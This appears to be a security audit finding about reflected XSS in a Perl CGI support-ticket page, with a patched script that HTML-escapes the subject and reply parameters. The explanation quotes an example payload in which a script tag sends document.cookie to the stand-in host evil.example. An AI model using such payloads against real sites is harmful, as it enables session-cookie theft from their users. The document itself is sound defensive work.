## Verdict

Confirmed. `$ticket_subject` and `$customer_reply` are attacker-controlled CGI parameters that are concatenated directly into an HTML string and written to the response without any output encoding, allowing reflected cross-site scripting.

## Source

- `$ticket_subject = $cgi->param('subject')` (line 12)
- `$customer_reply = $cgi->param('reply')` (line 13)

Both come from `CGI->new` request parameters, which are fully attacker-controlled.

## Fix

```perl
#!/usr/bin/perl
use strict;
use warnings;
use CGI;

# Renders a single support ticket, including its subject line and the
# latest customer reply, as a small HTML fragment for the helpdesk UI.

my $cgi = CGI->new;

my $ticket_id      = $cgi->param('ticket_id');
my $ticket_subject = $cgi->param('subject');
my $customer_reply = $cgi->param('reply');

print $cgi->header('text/html');
print "<html><head><title>Ticket View</title></head><body>\n";

my $status_badge = build_status_badge($ticket_id);

my $ticket_html = "<div class='ticket'>"
    . "<h2>" . $cgi->escapeHTML($ticket_subject) . "</h2>"
    . "<div class='reply'>" . $cgi->escapeHTML($customer_reply) . "</div>"
    . $status_badge
    . "</div>";

print $ticket_html;

print "</body></html>\n";

sub build_status_badge {
    my ($id) = @_;
    return "<span class='badge'>Open</span>" if defined $id;
    return "<span class='badge'>Unknown</span>";
}
```

## Explanation

The handler builds `$ticket_html` by directly interpolating `$ticket_subject` and `$customer_reply` into an HTML fragment with plain string concatenation, then writes that fragment straight to the response body at line 27. Neither value is validated against an allowlist or encoded for the HTML context, so a request such as `subject=<script>document.location='https://evil.example/steal?c='+document.cookie</script>` or a `reply` containing an `<img onerror=...>` payload is emitted verbatim into the page and executes in the viewing agent's browser as reflected XSS. Because both values are rendered inside HTML element content (not an attribute or a script context), HTML-entity encoding at the point of output is the correct and sufficient defense.

The fix wraps both values with `$cgi->escapeHTML()` (from the same `CGI` object already in use, so no new dependency is introduced) immediately before they are concatenated into `$ticket_html`. This converts `<`, `>`, `&`, and quote characters into their HTML entity equivalents, so injected markup is rendered as inert text rather than parsed as HTML/JavaScript. `$status_badge` and `$ticket_id` do not need escaping here: `build_status_badge` only ever emits one of two fixed, non-parameter-derived strings, so it carries no attacker-controlled content. Encoding is applied at the last point before output, next to the concatenation, which keeps the fix localized to the actual sink rather than trying to sanitize the parameters at the point they are read (where the same values might later be needed unescaped for a non-HTML use, such as logging or a database query).

Verification: submit `subject` and `reply` values containing `<`, `>`, and `&`, then confirm the rendered response contains the corresponding `&lt;`, `&gt;`, and `&amp;` entities in the `<h2>` and `<div class='reply'>` elements rather than raw markup, and that a `<script>` or `onerror` payload no longer appears as live markup in the page source.
